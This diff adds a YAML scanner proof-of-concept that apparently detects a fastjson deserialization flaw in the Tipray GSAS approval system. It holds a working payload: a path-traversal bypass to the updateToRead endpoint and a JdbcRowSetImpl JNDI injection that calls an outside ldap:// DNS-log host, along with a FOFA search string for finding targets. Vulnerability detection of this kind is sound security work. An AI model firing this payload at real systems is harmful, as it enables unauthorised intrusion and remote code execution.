@@ -1,0 +1,32 @@
+id: poc-yaml-tipray-gsas-updatetoread-fastjson-deserialization
+info:
+  name: 天锐绿盾审批系统 updateToRead fastjson 反序列化漏洞
+  severity: critical
+  tags:
+  - 反序列化
+  - DNSLOG
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  random: random_str(6)
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/rest/ext/updateToRead
+  headers:
+    Content-Type: application/json
+  data: "{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\"\
+    : \"ldap://{{.domain}}/{{.random}}\",\n    \"autoCommit\": true\n}"
+  expression: 'status_code == 500 &&
+
+    contains(content_type,"application/json") &&
+
+    contains(body,"set property error") &&
+
+    !contains(body,"<") &&
+
+    reverse.Verify()
+
+    '
+transport: http
